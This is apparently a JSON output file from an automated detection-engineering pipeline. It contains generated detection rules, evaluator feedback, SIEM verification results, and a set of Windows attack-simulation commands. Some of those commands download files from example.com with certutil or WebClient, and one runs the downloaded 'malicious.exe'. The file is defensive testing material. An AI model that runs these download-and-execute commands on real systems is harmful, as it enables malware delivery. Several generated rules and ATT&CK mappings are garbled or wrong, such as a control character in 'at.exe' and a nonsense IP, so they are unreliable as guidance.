        "title": "Cellular Communication Detection",
        "description": "Detects usage of cellular communication for potential command and control",
        "logsource": {
          "category": "network_connection",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "DestinationPort|contains": "1234",
            "CommandLine|contains": "cell ID"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate cellular communication software",
          "Network debugging tools"
        ],
        "level": "medium",
        "tags": [
          "attack.command_and_control",
          "attack.t1567",
          "technique.cellular_communication"
        ],
        "ttp_id": "unknown",
        "technique_name": "Cellular Communication",
        "generation_method": "langchain",
        "id": "09f98c60-8dc2-47c3-bf20-26b04d74217b",
        "siem_verification": {
          "rule_id": "09f98c60-8dc2-47c3-bf20-26b04d74217b",
          "attack_id": "e087b7aa-06ab-465e-88f9-9c23c45b5080",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 1065.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Data Encoding for Exfiltration",
        "description": "Detects potential data encoding for exfiltration",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "[Convert]::ToBase64String"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate use of PowerShell for encoding data",
          "Encoding data for non-exfiltration purposes"
        ],
        "level": "medium",
        "tags": [
          "attack.exfiltration",
          "attack.t1567.001"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Encoding",
        "generation_method": "langchain",
        "id": "8e10cba7-45ef-426d-86b5-918a24e53a16",
        "siem_verification": {
          "rule_id": "8e10cba7-45ef-426d-86b5-918a24e53a16",
          "attack_id": "f234c9a0-6b87-41ea-8506-be9ad4e87fd4",
          "detected": true,
          "events_found": 10,
          "historical_events": 0,
          "query_time_ms": 1050.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Remote Access Tool (RAT) Detection",
        "description": "Detects potential remote access and control via Remote Access Tool (RAT) malware",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate PowerShell usage with encryption",
          "System administration tasks"
        ],
        "level": "high",
        "tags": [
          "attack.command_and_control",
          "attack.t1566",
          "custom.remote_access_tool",
          "custom.rat",
          "custom.malware"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Access Tool (RAT)",
        "generation_method": "langchain",
        "id": "4b766af3-7a12-4d29-95ce-5e9113b3253f",
        "siem_verification": {
          "rule_id": "4b766af3-7a12-4d29-95ce-5e9113b3253f",
          "attack_id": "9dd51d22-1916-4e83-bf6e-b4c66dded7b5",
          "detected": true,
          "events_found": 10,
          "historical_events": 0,
          "query_time_ms": 575.0000000000001,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Access Tool (AT) Detection",
        "description": "Detects potential access tool usage based on AT indicators",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\u0007t.exe"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system administration tasks",
          "AT.exe used by system administrators for maintenance purposes"
        ],
        "level": "medium",
        "tags": [
          "attack.credential_access",
          "attack.t1566"
        ],
        "ttp_id": "unknown",
        "technique_name": "Access Tool (AT)",
        "generation_method": "langchain",
        "id": "65d851a5-028b-4890-91f1-b5b513c3e25e",
        "siem_verification": {
          "rule_id": "65d851a5-028b-4890-91f1-b5b513c3e25e",
          "attack_id": "9fc42276-21fa-4a57-b12a-85d0023e1019",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 1656.0000000000002,
          "status": "success",
          "message": "Verification complete"
        }
      }
    ]
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "rules_evaluated": 5,
      "average_quality_score": 0.566,
      "passing_rules": 2,
      "failing_rules": 3,
      "langchain_evaluations": 86,
      "fallback_evaluations": 0,
      "errors": 0,
      "processing_time_ms": 4554.278
    },
    "evaluation_results": [
      {
        "rule_title": "Unusual Communication Detection",
        "rule_id": "481c5a3b-a1f1-44fe-ae50-f6f5007a58ac",
        "quality_score": 0.44000000000000006,
        "status": "fail",
        "strengths": [
          "The rule has a clear title and description",
          "It includes relevant tags and a technique name"
        ],
        "weaknesses": [
          "The rule failed to detect the attack in the real SIEM",
          "It contains a hardcoded IP address (77052000601) not present in the TTP info, which could be considered a hallucination"
        ],
        "suggestions": [
          "Update the rule to use more dynamic and relevant detection logic",
          "Remove the hardcoded IP address and replace it with a more generic or TTP-based detection mechanism",
          "Optimize the query for better performance",
          "Consider adding more context or filtering to reduce potential false positives"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.8
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Cellular Communication Detection",
        "rule_id": "09f98c60-8dc2-47c3-bf20-26b04d74217b",
        "quality_score": 0.44000000000000006,
        "status": "fail",
        "strengths": [
          "The rule has a clear title and description",
          "It includes relevant tags and a technique name"
        ],
        "weaknesses": [
          "The rule failed to detect the attack in the real SIEM verification",
          "It contains a vague condition with 'contains' operators which may lead to false positives",
          "The log source is limited to Windows Sysmon, which may not cover all potential cellular communication detection scenarios",
          "The rule does not include any specific IPs or domains, but the condition is still quite generic"
        ],
        "suggestions": [
          "Improve the detection logic to increase the detection coverage",
          "Add more specific conditions to reduce false positives",
          "Consider adding more log sources to increase the rule's completeness",
          "Test the rule with different datasets to validate its effectiveness"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.8
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Data Encoding for Exfiltration",
        "rule_id": "8e10cba7-45ef-426d-86b5-918a24e53a16",
        "quality_score": 0.75,
        "status": "pass",
        "strengths": [
          "The rule detects the target TTP 'Data Encoding' with a high detection rate as shown in the real-world verification result",
          "The rule is well-structured and contains all necessary fields for detection and analysis"
        ],
        "weaknesses": [
          "The rule may generate false positives due to legitimate use of PowerShell for encoding data",
          "The rule does not account for other potential encoding methods beyond Base64"
        ],
        "suggestions": [
          "Add additional conditions to filter out legitimate use of PowerShell",
          "Consider including other encoding methods in the detection logic",
          "Continuously monitor and update the rule to improve its detection coverage and reduce false positives"
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.9,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Remote Access Tool (RAT) Detection",
        "rule_id": "4b766af3-7a12-4d29-95ce-5e9113b3253f",
        "quality_score": 0.76,
        "status": "pass",
        "strengths": [
          "The rule has a clear and specific detection logic",
          "It uses a relevant log source (Sysmon) for process creation events",
          "The rule has a high level of completeness with all necessary fields"
        ],
        "weaknesses": [
          "The rule may generate false positives due to legitimate PowerShell usage with encryption",
          "It does not account for potential evasion techniques used by attackers",
          "The rule contains no IPs or domains, but its detection logic is relatively simple and may not catch all variations of the Remote Access Tool (RAT) technique"
        ],
        "suggestions": [
          "Add more specific conditions to reduce false positives, such as filtering out known legitimate processes or commands",
          "Consider adding additional log sources or detection logic to improve the rule's effectiveness",
          "Continuously monitor and update the rule to stay ahead of evolving attacker techniques and tactics"
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.9,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Access Tool (AT) Detection",
        "rule_id": "65d851a5-028b-4890-91f1-b5b513c3e25e",
        "quality_score": 0.44000000000000006,
        "status": "fail",
        "strengths": [
          "The rule has a clear title and description",
          "It includes relevant tags and a technique name"
        ],
        "weaknesses": [
          "The rule failed to detect the attack in the real SIEM",
          "It contains no IPs or domains, but the detection logic is based on a simple string match which may not be robust",
          "The false positives section mentions legitimate system administration tasks, which could be a significant source of noise"
        ],
        "suggestions": [
          "Improve the detection logic to reduce false positives and increase detection coverage",
          "Add more context to the rule, such as user or group information, to help filter out legitimate activity",
          "Consider adding more specific indicators, such as command line arguments or network activity, to increase the confidence in detections"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.8
        },
        "evaluation_method": "langchain"
      }
    ],
    "feedback": {
      "timestamp": "2025-12-20T11:11:30.779683",
      "source_agent": "069f21fe-e2f9-426f-9a0c-1a63992697f7",
      "target_agent": "rulegen",
      "average_quality_score": 0.566,
      "total_rules_evaluated": 5,
      "improvements_needed": [
        {
          "metric": "quality",
          "current_value": 0.5660000000000001,
          "target_value": 0.85,
          "suggestion": "Improve overall rule quality"
        }
      ],
      "common_issues": [
        "The rule failed to detect the attack in the real SIEM",
        "It contains a hardcoded IP address (77052000601) not present in the TTP info, which could be considered a hallucination",
        "The rule failed to detect the attack in the real SIEM verification",
        "It contains a vague condition with 'contains' operators which may lead to false positives",
        "The log source is limited to Windows Sysmon, which may not cover all potential cellular communication detection scenarios"
      ],
      "actionable_suggestions": [
        "Update the rule to use more dynamic and relevant detection logic",
        "Remove the hardcoded IP address and replace it with a more generic or TTP-based detection mechanism",
        "Optimize the query for better performance",
        "Consider adding more context or filtering to reduce potential false positives",
        "Improve the detection logic to increase the detection coverage"
      ]
    }
  },
  "attacks": [
    {
      "id": "26fcb8e9-7333-4a56-b5b7-23ea30b4bf28",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Unusual Communication",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Write-Host 'Unusual communication test'; $sock = New-Object System.Net.Sockets.TCPClient('example.com', 80); $sock.Close()}\",",
      "description": "Establishes a TCP connection to a remote server for command and control",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command establishes a TCP connection to example.com on port 80 and then closes it.",
      "source": "langchain",
      "generated_at": "2025-12-20T11:09:57.910995",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e087b7aa-06ab-465e-88f9-9c23c45b5080",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Unusual Communication",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/malicious.exe %TEMP%\\malicious.exe && %TEMP%\\malicious.exe",
      "description": "Downloads an executable from a remote server and executes it",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The command downloads an executable from example.com and executes it. Note: This command is for testing only and should not be used with actual malicious payloads.",
      "source": "langchain",
      "generated_at": "2025-12-20T11:09:57.910995",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f234c9a0-6b87-41ea-8506-be9ad4e87fd4",
      "ttp_id": "unknown",
      "technique_id": "T1042",
      "technique_name": "Unusual Communication",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Write-Host 'Unusual DNS query test'; $dns = 'example.com'; Resolve-DnsName -Name $dns -Type A -Server 8.8.8.8}\",",
      "description": "Performs a DNS query to a remote server for command and control",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command performs a DNS query for example.com using the Google public DNS server.",
      "source": "langchain",
      "generated_at": "2025-12-20T11:09:57.910995",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9dd51d22-1916-4e83-bf6e-b4c66dded7b5",
      "ttp_id": "unknown",
      "technique_id": "T1090",
      "technique_name": "Cellular Communication",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Net.WebRequest]::Create('http://example.com')\"",
      "description": "Detects usage of cellular communication for potential command and control using PowerShell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will create a web request to the specified URL, potentially establishing a command and control channel.",
      "source": "langchain",
      "generated_at": "2025-12-20T11:09:58.417165",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9fc42276-21fa-4a57-b12a-85d0023e1019",
      "ttp_id": "unknown",
      "technique_id": "T1090",
      "technique_name": "Cellular Communication",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/test.txt %TEMP%\\test.txt",
      "description": "Detects usage of cellular communication for potential command and control using certutil",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will download the file from the specified URL and save it to the temp directory, potentially establishing a command and control channel.",
      "source": "langchain",
      "generated_at": "2025-12-20T11:09:58.417165",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "088f595c-0e87-4925-b37c-3da8103cac32",
      "ttp_id": "unknown",
      "technique_id": "T1090",
      "technique_name": "Cellular Communication",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Net.WebClient]::DownloadString('http://example.com')\"",
      "description": "Detects usage of cellular communication for potential command and control using WebClient",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will download the content from the specified URL, potentially establishing a command and control channel.",
      "source": "langchain",
      "generated_at": "2025-12-20T11:09:58.417165",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d380a158-97bb-4085-b841-43164050f417",
      "ttp_id": "unknown",
      "technique_id": "T1132",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[Convert]::ToBase64String([Text.Encoding]::UTF16LE.GetBytes('Write-Host Test'))\"",
      "description": "Generate Base64 encoded string from UTF-16LE bytes for testing data encoding",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Output a Base64 encoded string",
      "source": "langchain",
      "generated_at": "2025-12-20T11:09:58.924844",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d5d4d59c-e39b-41da-9b79-2fdf5564ce67",
      "ttp_id": "unknown",
      "technique_id": "T1132",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -encode %TEMP%\\test.txt %TEMP%\\encoded.txt",
      "description": "Use certutil to encode a file for testing data encoding",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Create an encoded file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-20T11:09:58.924844",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "dddbf75d-d7bb-4ff0-8ced-5fd297c27817",
      "ttp_id": "unknown",
      "technique_id": "T1132",
      "technique_name": "Data Encoding",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"'SGVsbG8gd29ybGQ=' | Base64 -Decode | Out-File -FilePath %TEMP%\\decoded.txt\"",
      "description": "Decode a Base64 encoded string and write to a file for testing data encoding",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Create a decoded file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-20T11:09:58.924844",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "366f721c-81db-4299-a65d-5886046b2a27",
      "ttp_id": "unknown",
      "technique_id": "T1219",
      "technique_name": "Remote Access Tool (RAT)",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Start-Process -FilePath 'cmd.exe' -ArgumentList '/c net start' -Verb RunAs}\"",
      "description": "Starts a new process with elevated privileges to execute the net start command",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new process will be started with elevated privileges and the net start command will be executed",
      "source": "langchain",
      "generated_at": "2025-12-20T11:10:00.432100",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "33082b2b-d09b-4bb1-bbca-836bd547b29c",
      "ttp_id": "unknown",
      "technique_id": "T1219",
      "technique_name": "Remote Access Tool (RAT)",
      "tactic": "execution",
      "platform": "windows",
      "command": "net start",
      "description": "Lists all running services",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A list of all running services will be displayed",
      "source": "langchain",
      "generated_at": "2025-12-20T11:10:00.432100",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "054bbf67-f1e2-4991-a06d-1c661320d0d6",
      "ttp_id": "unknown",
      "technique_id": "T1219",
      "technique_name": "Remote Access Tool (RAT)",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Invoke-Expression -Command '(New-Object System.Net.WebClient).DownloadString(\"file:///%TEMP%/test.txt\")'}\"",
      "description": "Downloads a file from a local path using WebClient",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The contents of the file will be downloaded and executed",
      "source": "langchain",
      "generated_at": "2025-12-20T11:10:00.432100",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "051d0a5b-3133-4493-bfc7-77fc8257faa0",
      "ttp_id": "unknown",
      "technique_id": "T1218",
      "technique_name": "Access Tool (AT)",
      "tactic": "execution",
      "platform": "windows",
      "command": "net start",
      "description": "Detects potential access tool usage by starting a service",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Starts a service",
      "source": "langchain",
      "generated_at": "2025-12-20T11:10:01.076321",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4ba68d04-865e-460c-9ee2-62fc0c110612",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Access Tool (AT)",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Management.Automation; $runspace = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace(); $runspace.Open(); $pipeline = $runspace.CreatePipeline(); $pipeline.Commands.AddScript('Get-Process'); $pipeline.Invoke(); $runspace.Close()\"",
      "description": "Detects potential access tool usage by running a PowerShell command",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Runs a PowerShell command",
      "source": "langchain",
      "generated_at": "2025-12-20T11:10:01.076321",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "eda1114b-98c9-4080-b492-27bc95d80dc4",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Access Tool (AT)",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/test.txt %TEMP%\\test.txt && type %TEMP%\\test.txt",
      "description": "Detects potential access tool usage by downloading and executing a file",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads and executes a file",
      "source": "langchain",
      "generated_at": "2025-12-20T11:10:01.076321",
      "agent_id": "0d6475b1-fee6-480c-b3d9-3a7057a9eb95",
      "confidence_score": 0.8,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "481c5a3b-a1f1-44fe-ae50-f6f5007a58ac",
      "attack_id": "26fcb8e9-7333-4a56-b5b7-23ea30b4bf28",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 640.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "09f98c60-8dc2-47c3-bf20-26b04d74217b",
      "attack_id": "e087b7aa-06ab-465e-88f9-9c23c45b5080",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 1065.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "8e10cba7-45ef-426d-86b5-918a24e53a16",
      "attack_id": "f234c9a0-6b87-41ea-8506-be9ad4e87fd4",
      "detected": true,
      "events_found": 10,
      "historical_events": 0,
      "query_time_ms": 1050.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "4b766af3-7a12-4d29-95ce-5e9113b3253f",
      "attack_id": "9dd51d22-1916-4e83-bf6e-b4c66dded7b5",
      "detected": true,
      "events_found": 10,
      "historical_events": 0,
      "query_time_ms": 575.0000000000001,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "65d851a5-028b-4890-91f1-b5b513c3e25e",
      "attack_id": "9fc42276-21fa-4a57-b12a-85d0023e1019",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 1656.0000000000002,
      "status": "success",
      "message": "Verification complete"
    }
  ],
  "siem_metrics": {
    "true_positives": 2,
    "false_positives": 0,
    "false_negatives": 3,
    "true_negatives": 0,
    "precision": 1.0,
    "recall": 0.4,
    "f1_score": 0.5714285714285715,
    "accuracy": 0.4,
    "detection_rate": 0.4,
    "false_positive_rate": 0.0
  },
  "iterations": 3,
  "final_score": 0.566,
  "timestamp": "2025-12-20T18:14:38.429961"
}